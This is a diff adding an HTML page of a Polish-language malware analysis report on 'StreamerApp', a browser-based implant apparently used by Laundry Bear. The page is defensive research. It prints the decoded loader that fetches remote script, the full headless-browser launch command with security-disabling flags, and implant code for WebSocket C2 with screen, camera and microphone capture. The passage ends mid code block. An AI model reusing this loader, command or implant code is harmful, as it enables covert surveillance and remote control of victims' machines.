@@ -1,0 +1,682 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Kiedy przeglądarka staje się implantem: StreamerApp - nowe narzędzie w arsenale Laundry Bear | MalReports</title><meta name="description" content="Analiza wariantu StreamerApp, w którym aplet CPL uruchamia przeglądarkowy implant wykorzystujący Chromium, WebSocket i Chrome DevTools Protocol."><style>.info-card-tags[data-astro-cid-hyntgva6]{display:flex;flex-wrap:wrap;align-items:center;gap:.45rem;margin-top:0}.info-card-tag[data-astro-cid-hyntgva6]{display:inline-flex;align-items:center;min-height:1.72rem;padding:0 .58rem;border:1px solid rgba(158,184,201,.2);color:var(--landing-accent);background:#9eb8c90f;font-family:var(--font-mono);font-size:.74rem;font-weight:700;letter-spacing:.07em;text-transform:uppercase}
+</style>
+<link rel="stylesheet" href="/_astro/ReportLayout.DvubeBgr.css">
+<link rel="stylesheet" href="/_astro/reports.oy7jCBHV.css"></head> <body class="landing-theme">   <div class="landing-page">   <header class="topbar" data-topbar-root> <a class="brand-lockup" href="/en/"> <span class="brand-name">Irondefence</span> <span class="brand-subtitle">Malware Analysis Lab</span> </a> <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-drawer" aria-label="Open navigation menu" data-menu-toggle> <span></span> <span></span> <span></span> </button> <nav class="topnav" aria-label="Primary"> <div class="topnav-links"> <a class="nav-link primary" href="/en/reports/">Reports</a> </div> <span class="nav-divider" aria-hidden="true"></span> <a class="nav-link nav-link-github" href="https://github.com/irondefence/MalReports" target="_blank" rel="noreferrer"> <svg width="1em" height="1em" class="nav-link-icon" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg> <span class="nav-link-label">GitHub</span> </a> <div class="nav-lang-switch"> <!-- <span class="nav-lang-label">{t.language}</span> --> <div class="nav-lang-track"> <a class="nav-lang-link active" href="/en/reports/streamerapp-laundry-bear-browser-implant/">ENG</a> <a class="nav-lang-link" href="/pl/raporty/streamerapp-laundry-bear-browser-implant/">PL</a> </div> </div> </nav> <div class="mobile-nav" data-mobile-nav> <button class="mobile-overlay" type="button" aria-label="Close navigation menu" data-menu-close></button> <aside class="mobile-drawer" id="mobile-drawer" aria-label="Mobile navigation" tabindex="-1"> <div class="mobile-drawer-head"> <div class="mobile-brand"> <span class="brand-name">Irondefence</span> <span class="brand-subtitle">Malware Analysis Lab</span> </div> <button class="mobile-close" type="button" aria-label="Close navigation menu" data-menu-close> <span></span> <span></span> </button> </div> <div class="mobile-drawer-body"> <a class="mobile-link primary" href="/en/reports/" data-menu-link>Reports</a> <a class="mobile-link" href="https://github.com/irondefence/MalReports" target="_blank" rel="noreferrer" data-menu-link> <svg width="1em" height="1em" viewBox="0 0 24 24" class="mobile-link-icon" data-icon="lucide:github">   <use href="#ai:lucide:github"></use>  </svg> <span>GitHub</span> </a> <div class="mobile-lang-switch"> <span class="mobile-lang-label">Language</span> <div class="mobile-lang-links"> <a class="mobile-lang-link active" href="/en/reports/streamerapp-laundry-bear-browser-implant/" data-menu-link>ENG</a> <a class="mobile-lang-link" href="/pl/raporty/streamerapp-laundry-bear-browser-implant/" data-menu-link>PL</a> </div> </div> </div> </aside> </div> </header> <script>
+  const header = document.querySelector("[data-topbar-root]");
+
+  if (header) {
+    const body = document.body;
+    const toggle = header.querySelector("[data-menu-toggle]");
+    const drawer = header.querySelector("#mobile-drawer");
+    const closeButtons = header.querySelectorAll("[data-menu-close], [data-menu-link]");
+
+    const setMenu = (open) => {
+      header.dataset.menuOpen = open ? "true" : "false";
+      body.classList.toggle("mobile-menu-open", open);
+
+      if (toggle instanceof HTMLButtonElement) {
+        toggle.setAttribute("aria-expanded", open ? "true" : "false");
+        toggle.setAttribute("aria-label", open ? "Close navigation menu" : "Open navigation menu");
+      }
+
+      if (open && drawer instanceof HTMLElement) {
+        drawer.focus();
+      }
+    };
+
+    if (toggle instanceof HTMLButtonElement) {
+      toggle.addEventListener("click", () => {
+        setMenu(header.dataset.menuOpen !== "true");
+      });
+    }
+
+    for (const button of closeButtons) {
+      button.addEventListener("click", () => setMenu(false));
+    }
+
+    window.addEventListener("keydown", (event) => {
+      if (event.key === "Escape") {
+        setMenu(false);
+      }
+    });
+
+    const media = window.matchMedia("(min-width: 761px)");
+    media.addEventListener("change", (event) => {
+      if (event.matches) {
+        setMenu(false);
+      }
+    });
+  }
+</script>   <main class="report-page">    <div class="report-shell" data-report-shell data-active-tab="report" data-astro-cid-hyntgva6> <aside class="report-sidebar" data-report-sidebar data-astro-cid-hyntgva6> <div class="report-sidebar-inner" data-astro-cid-hyntgva6> <div class="report-sidebar-head" data-astro-cid-hyntgva6> <p class="report-sidebar-title" data-astro-cid-hyntgva6>Other reports</p> <button class="report-sidebar-toggle" type="button" aria-expanded="true" aria-controls="report-sidebar-panel" aria-label="Toggle report sidebar" data-report-sidebar-toggle data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="report-sidebar-toggle-icon icon-open" data-astro-cid-hyntgva6="true" data-icon="lucide:panel-left-open">   <symbol id="ai:lucide:panel-left-open" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18m5-12l3 3l-3 3"/></g></symbol><use href="#ai:lucide:panel-left-open"></use>  </svg> <svg width="1em" height="1em" class="report-sidebar-toggle-icon icon-close" data-astro-cid-hyntgva6="true" data-icon="lucide:panel-left-close">   <symbol id="ai:lucide:panel-left-close" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M9 3v18m7-6l-3-3l3-3"/></g></symbol><use href="#ai:lucide:panel-left-close"></use>  </svg> </button> </div> <div class="report-sidebar-panel" id="report-sidebar-panel" data-report-sidebar-panel data-astro-cid-hyntgva6> <nav class="report-sidebar-nav" aria-label="Other reports" data-astro-cid-hyntgva6> <a class="report-sidebar-link" href="/en/reports/cve-2026-21509-crafty-leshy/" data-astro-cid-hyntgva6> <span class="report-sidebar-link-title" data-astro-cid-hyntgva6>CVE-2026-21509 | Campaign analysis and COM abuse chain</span> </a> </nav> </div> </div> </aside> <div class="report-stack" data-astro-cid-hyntgva6> <header class="report-hero" data-astro-cid-hyntgva6> <div class="report-topbar" data-astro-cid-hyntgva6> <a class="back-link" href="/en/reports/" data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="back-link-icon" aria-hidden="true" data-astro-cid-hyntgva6="true" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <span data-astro-cid-hyntgva6>Back to archive</span> </a> </div> <p class="report-kicker" data-astro-cid-hyntgva6>Report dossier</p> <h1 class="report-title" data-astro-cid-hyntgva6>Kiedy przeglądarka staje się implantem: StreamerApp - nowe narzędzie w arsenale Laundry Bear</h1> <p class="report-description" data-astro-cid-hyntgva6>Analiza wariantu StreamerApp, w którym aplet CPL uruchamia przeglądarkowy implant wykorzystujący Chromium, WebSocket i Chrome DevTools Protocol.</p> <div class="report-info-grid" data-astro-cid-hyntgva6> <div class="info-card" data-astro-cid-hyntgva6> <span class="info-card-icon" aria-hidden="true" data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="info-icon" data-astro-cid-hyntgva6="true" data-icon="lucide:calendar-days">   <symbol id="ai:lucide:calendar-days" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M8 2v4m8-4v4"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M3 10h18M8 14h.01M12 14h.01M16 14h.01M8 18h.01M12 18h.01M16 18h.01"/></g></symbol><use href="#ai:lucide:calendar-days"></use>  </svg> </span> <span class="info-card-label" data-astro-cid-hyntgva6>Published</span> <span class="info-card-value" data-astro-cid-hyntgva6>15/03/2026</span> </div> <div class="info-card" data-astro-cid-hyntgva6> <span class="info-card-icon" aria-hidden="true" data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="info-icon" data-astro-cid-hyntgva6="true" data-icon="lucide:braces">   <symbol id="ai:lucide:braces" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 3H7a2 2 0 0 0-2 2v5a2 2 0 0 1-2 2a2 2 0 0 1 2 2v5c0 1.1.9 2 2 2h1m8 0h1a2 2 0 0 0 2-2v-5c0-1.1.9-2 2-2a2 2 0 0 1-2-2V5a2 2 0 0 0-2-2h-1"/></symbol><use href="#ai:lucide:braces"></use>  </svg> </span> <span class="info-card-label" data-astro-cid-hyntgva6>Report ID</span> <span class="info-card-value" data-astro-cid-hyntgva6>streamerapp-laundry-bear-browser-implant</span> </div> <div class="info-card" data-astro-cid-hyntgva6> <span class="info-card-icon" aria-hidden="true" data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="info-icon" data-astro-cid-hyntgva6="true" data-icon="lucide:languages">   <symbol id="ai:lucide:languages" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 8l6 6m-7 0l6-6l2-3M2 5h12M7 2h1m14 20l-5-10l-5 10m2-4h6"/></symbol><use href="#ai:lucide:languages"></use>  </svg> </span> <span class="info-card-label" data-astro-cid-hyntgva6>Language</span> <span class="info-card-value" data-astro-cid-hyntgva6>Polish</span> </div> <div class="info-card" data-astro-cid-hyntgva6> <span class="info-card-icon" aria-hidden="true" data-astro-cid-hyntgva6> <svg width="1em" height="1em" class="info-icon" data-astro-cid-hyntgva6="true" data-icon="lucide:tags">   <symbol id="ai:lucide:tags" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M13.172 2a2 2 0 0 1 1.414.586l6.71 6.71a2.4 2.4 0 0 1 0 3.408l-4.592 4.592a2.4 2.4 0 0 1-3.408 0l-6.71-6.71A2 2 0 0 1 6 9.172V3a1 1 0 0 1 1-1zM2 7v6.172a2 2 0 0 0 .586 1.414l6.71 6.71a2.4 2.4 0 0 0 3.191.193"/><circle cx="10.5" cy="6.5" r=".5" fill="currentColor"/></g></symbol><use href="#ai:lucide:tags"></use>  </svg> </span> <span class="info-card-label" data-astro-cid-hyntgva6>Tags</span> <div class="info-card-tags" data-astro-cid-hyntgva6> <span class="info-card-tag" data-astro-cid-hyntgva6>laundry bear</span><span class="info-card-tag" data-astro-cid-hyntgva6>void blizzard</span><span class="info-card-tag" data-astro-cid-hyntgva6>streamerapp</span><span class="info-card-tag" data-astro-cid-hyntgva6>cpl</span><span class="info-card-tag" data-astro-cid-hyntgva6>chromium</span><span class="info-card-tag" data-astro-cid-hyntgva6>websocket</span><span class="info-card-tag" data-astro-cid-hyntgva6>cdp</span><span class="info-card-tag" data-astro-cid-hyntgva6>browser implant</span> </div> </div> </div> </header> <section class="report-tabs-shell" data-report-tabs data-astro-cid-hyntgva6> <div class="report-tabs-nav" role="tablist" aria-label="Report content tabs" data-astro-cid-hyntgva6> <button class="report-tab active" type="button" role="tab" aria-selected="true" aria-controls="report-panel" id="report-tab" data-tab-trigger="report" data-astro-cid-hyntgva6> Report </button> <button class="report-tab" type="button" role="tab" aria-selected="false" aria-controls="yara-panel" id="yara-tab" data-tab-trigger="yara" data-astro-cid-hyntgva6> YARA rules </button> </div> <section class="tab-panel active" id="report-panel" role="tabpanel" aria-labelledby="report-tab" data-tab-panel="report" data-astro-cid-hyntgva6> <article class="report-prose" data-astro-cid-hyntgva6> <h1 id="kiedy-przeglądarka-staje-się-implantem-streamerapp---nowe-narzędzie-w-arsenale-laundry-bear">Kiedy przeglądarka staje się implantem: StreamerApp - nowe narzędzie w arsenale Laundry Bear</h1>
+<p><img src="https://miro.medium.com/v2/resize:fit:875/1*86dpd_mOZUUXAcHUNobM2w.png" alt=""></p>
+<p>Na pierwszy rzut oka ta próbka nie wygląda jak szczególnie ambitny backdoor. Nie ma tu wielkiego natywnego beacona, nie ma od razu oczywistej persystencji, nie ma też klasycznego schematu: „dropper zapisuje EXE, odpala payload i kończy robotę”.</p>
+<p><strong>Zamiast tego robi coś znacznie ciekawszego.</strong></p>
+<p>W analizowanym wariancie punkt wejścia infekcji stanowi plik <code>.cpl</code>, czyli aplet Panelu sterowania systemu Windows. Technicznie rzecz biorąc, CPL jest biblioteką DLL ładowaną przez <code>control.exe</code>. Nieoczywiste rozszerzenie daje atakującemu wiarygodny i mało rzucający się w oczy launcher dla dalszych etapów infekcji, a także może zwiększać jego skuteczność jako ładunku phishingowego.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:875/1*Z-tv1Y4hVL6zjd2_EE6PZQ.png" alt=""></p>
+<p>W tym przypadku sam CPL nie jest właściwym implantem. Jego zadaniem jest przygotowanie środowiska i uruchomienie kolejnego, „przeglądarkowego” etapu zakażenia.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:875/1*0_4cY5M5noR8t7no_74MKg.png" alt=""></p>
+<p><em>Full chain process creation flow</em></p>
+<h2 id="od-apletu-panelu-sterowania-do-browser-based-implant">Od apletu Panelu sterowania do browser-based implant</h2>
+<p>Jak wcześniej wspomniano, CPL jest odpowiedzialny za zainicjowanie procesu zakażenia. Tworzy on lokalny plik <code>.htm</code> w katalogu tymczasowym. Następnie sprawdza, czy w systemie znajduje się Microsoft Edge. Jeżeli nie, przełącza się na Chrome. Potem składa finalną komendę uruchomieniową i wykonuje ją przez <code>WinExec</code>.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:875/1*nGiJuqoVEHxzrdPHY_FBDQ.png" alt=""></p>
+<p><em>Binary flow</em></p>
+<p>W tym miejscu warto podkreślić, że kluczowe artefakty, takie jak ścieżki, parametry uruchomieniowe oraz payload zapisywany do pliku <code>.htm</code>, są przechowywane w postaci zaszyfrowanych bloków danych, które podczas wykonania są kopiowane do bufora tymczasowego, a następnie odszyfrowywane prostym XOR-em z cyklicznym kluczem 8-bajtowym. Mechanizm nie jest kryptograficznie złożony, ale skutecznie ukrywa najważniejsze artefakty przed prostą analizą statyczną.<br>
+Plik <code>.htm</code> tworzony jest w <code>%TEMP%</code> pod losową nazwą złożoną z dwunastu znaków alfanumerycznych. Poniżej zaprezentowano zawartość w nim umieszczoną, która jest odzyskiwana z zaszyfrowanego bloku danych:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">>document.</span><span style="color:#B392F0">write</span><span style="color:#E1E4E8">(String.</span><span style="color:#B392F0">fromCharCode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0x3c</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0x21</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0x44</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">...</span><span style="color:#79B8FF"> 0x3e</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0xa</span><span style="color:#E1E4E8">));&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>Po rozwinięciu <code>String.fromCharCode(...)</code> otrzymujemy właściwą treść lokalnego pliku:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#E1E4E8">&#x3C;!</span><span style="color:#85E89D">DOCTYPE</span><span style="color:#B392F0"> html</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">body</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8"> &#x3C;</span><span style="color:#85E89D">script</span><span style="color:#B392F0"> src</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"https[://]pastefy[.]app/B9LUfqZh/raw"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">body</span><span style="color:#E1E4E8">></span></span>
+<span class="line"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">html</span><span style="color:#E1E4E8">></span></span></code></pre>
+<h3 id="wybór-edge-i-fallback-do-chrome">Wybór Edge i fallback do Chrome</h3>
+<p>Launcher nie uruchamia przeglądarki w sposób przypadkowy. Jednym z odszyfrowanych stringów jest ścieżka rejestru:<br>
+<code>SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\ msedge.exe</code></p>
+<p>Jest ona sprawdzana w <code>HKCU</code> i <code>HKLM</code>, odczytuje domyślną wartość, normalizuje ścieżkę i weryfikuje obecność wskazanego pliku. Jeżeli <code>msedge.exe</code> istnieje, przechodzi do budowy komendy uruchomienia dla Edge, a w przeciwnym razie buduje komendę dla Chrome.</p>
+<h3 id="budowa-komendy-i-znaczenie-parametrów-uruchomieniowych">Budowa komendy i znaczenie parametrów uruchomieniowych</h3>
+<p>Właściwy charakter próbki ujawnia się dopiero po odszyfrowaniu stringów budujących finalną komendę — poprzez połączenie prefiksu, ścieżki do pliku <code>.htm</code> i suffixu z komendą do uruchomienia lure.</p>
+<p>Edge:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bat"><code><span class="line"><span style="color:#F97583">cmd</span><span style="color:#E1E4E8"> /c </span><span style="color:#F97583">start</span><span style="color:#E1E4E8"> msedge --headless=new --user-data-dir=</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">%TEMP%</span><span style="color:#9ECBFF">\XE"</span></span>
+<span class="line"><span style="color:#E1E4E8">--auto-select-screen-capture-source=true --use-fake-ui-for-media-stream</span></span>
+<span class="line"><span style="color:#E1E4E8">--no-sandbox --disable-user-media-security --disable-web-security</span></span>
+<span class="line"><span style="color:#E1E4E8">--remote-debugging-port=</span><span style="color:#79B8FF">9222</span><span style="color:#E1E4E8"> -remote-allow-origins=*</span></span>
+<span class="line"><span style="color:#E1E4E8">--allow-file-access-from-files </span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">%TEMP%</span><span style="color:#9ECBFF">\&#x3C;[A-Za-z0-9]{12}>.htm"</span></span>
+<span class="line"><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#F97583"> start</span><span style="color:#E1E4E8"> https[://]lnk[.]ua/lZRJggrBK</span></span></code></pre>
+<p>Chrome:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E1E4E8">cmd /c start chrome </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">headless</span><span style="color:#F97583">=new --</span><span style="color:#E1E4E8">user</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">data</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">dir</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"%TEMP%\XC"</span></span>
+<span class="line"><span style="color:#F97583">--</span><span style="color:#E1E4E8">auto</span><span style="color:#F97583">-select-</span><span style="color:#E1E4E8">screen</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">capture</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">source</span><span style="color:#F97583">=</span><span style="color:#79B8FF">true</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">use</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">fake</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">ui</span><span style="color:#F97583">-for-</span><span style="color:#E1E4E8">media</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">stream</span></span>
+<span class="line"><span style="color:#F97583">--</span><span style="color:#E1E4E8">no</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">sandbox </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">disable</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">user</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">media</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">security </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">disable</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">web</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">security</span></span>
+<span class="line"><span style="color:#F97583">--</span><span style="color:#E1E4E8">remote</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">debugging</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">port</span><span style="color:#F97583">=</span><span style="color:#79B8FF">9222</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">remote</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">allow</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">origins</span><span style="color:#F97583">=*</span></span>
+<span class="line"><span style="color:#F97583">--</span><span style="color:#E1E4E8">allow</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">file</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">access</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">from</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">files </span><span style="color:#9ECBFF">"%TEMP%\&#x3C;[A-Za-z0-9]{12}>.htm"</span></span>
+<span class="line"><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> start https[://]lnk[.]ua/lZRJggrBK</span></span></code></pre>
+<p>Właściwie dobrane parametry umożliwiają atakującemu uzyskanie pokaźnych możliwości:</p>
+<ul>
+<li><code>--headless=new</code> uruchamia browser bez klasycznego interfejsu;</li>
+<li><code>--user-data-dir</code> wymusza odrębny profil w <code>%TEMP%</code>, dzięki czemu cała aktywność odbywa się poza normalnym profilem użytkownika;</li>
+<li><code>--remote-debugging-port=9222</code> aktywuje Chrome DevTools Protocol, który później okazuje się istotnym elementem post-exploitation;</li>
+</ul>
+<p>Najważniejsze są jednak flagi osłabiające bezpieczeństwo:</p>
+<ul>
+<li><code>--allow-file-access-from-files</code> pozwala skryptowi uruchomionemu z lokalnego pliku <code>file://</code> odwoływać się do innych lokalnych zasobów;</li>
+<li><code>--disable-web-security</code> ogranicza ochrony same-origin i część restrykcji cross-origin;</li>
+<li><code>--disable-user-media-security</code> osłabia zabezpieczenia wokół interfejsów mediów użytkownika, czyli przede wszystkim kamery i mikrofonu;</li>
+<li><code>--use-fake-ui-for-media-stream</code> automatyzuje akceptację żądań dostępu do kamery i mikrofonu;</li>
+<li><code>--auto-select-screen-capture-source=true</code> eliminuje potrzebę ręcznego wyboru źródła przechwytywania ekranu.</li>
+</ul>
+<p><img src="https://miro.medium.com/v2/resize:fit:875/1*9rqFThPyDkBUE7R62haw4g.png" alt=""></p>
+<h3 id="potem-przeglądarka-przestaje-zachowywać-się-jak-przeglądarka">Potem przeglądarka przestaje zachowywać się jak przeglądarka</h3>
+<p>Poprzez załadowanie tworzonego pliku <code>.htm</code> pobierany jest ze zdalnej lokalizacji właściwy JavaScript, zaciemniony warstwą obfuskacji. To on pełni funkcję złośliwego implantu i daje możliwość komunikacji z serwerem C2 z wykorzystaniem WebSocket, przechwytywania obrazu i dźwięku oraz odczytu i transferu plików.</p>
+<h3 id="dalsza-część-analizy-został-zrealizowana-na-podstawie-kodu-po-refaktoryzacji-w-zakresie-nazewnctwa-zmiennych">Dalsza część analizy został zrealizowana na podstawie kodu po refaktoryzacji, w zakresie nazewnctwa zmiennych.</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">async </span><span style="color:#B392F0">start</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> wsUrl</span><span style="color:#F97583"> =</span><span style="color:#F97583"> await</span><span style="color:#E1E4E8"> Utils.</span><span style="color:#B392F0">getWebSocketUrl</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#ws </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> WebSocketManager</span><span style="color:#E1E4E8">(wsUrl);</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#ws.</span><span style="color:#B392F0">onClose</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> () </span><span style="color:#F97583">=></span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">#reconnect</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#screen </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> ScreenStreamer</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.#ws);</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#camera </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Camera</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.#ws);</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#mic </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Microphone</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.#ws);</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#files </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> FileManager</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">.#ws);</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">#setupHandlers</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#E1E4E8"> [</span><span style="color:#79B8FF">fingerprint</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">country</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#F97583"> await</span><span style="color:#79B8FF"> Promise</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">all</span><span style="color:#E1E4E8">([Utils.</span><span style="color:#B392F0">generateFingerprint</span><span style="color:#E1E4E8">(), </span><span style="color:#79B8FF">Promise</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">resolve</span><span style="color:#E1E4E8">(Utils.</span><span style="color:#B392F0">detectCountry</span><span style="color:#E1E4E8">())]);</span></span>
+<span class="line"><span style="color:#F97583">    await</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.#ws.</span><span style="color:#B392F0">connect</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#ws.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">({ type: </span><span style="color:#9ECBFF">'register'</span><span style="color:#E1E4E8">, id: fingerprint, country });</span></span>
+<span class="line"><span style="color:#F97583">    await</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.#screen.</span><span style="color:#B392F0">start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">#</span><span style="color:#B392F0">reconnect</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#camera?.</span><span style="color:#B392F0">stop</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#79B8FF">    this</span><span style="color:#E1E4E8">.#mic?.</span><span style="color:#B392F0">stop</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">    setTimeout</span><span style="color:#E1E4E8">(() </span><span style="color:#F97583">=></span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">start</span><span style="color:#E1E4E8">(), </span><span style="color:#79B8FF">3000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Podczas uruchomienia próbka w pierwszej kolejności pobiera właściwy adres C2, z którym następnie ma zostać ustanowione połączenie WebSocket.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> CONFIG_URL</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> 'https://pastefy.app/8gkXtCq0/raw'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
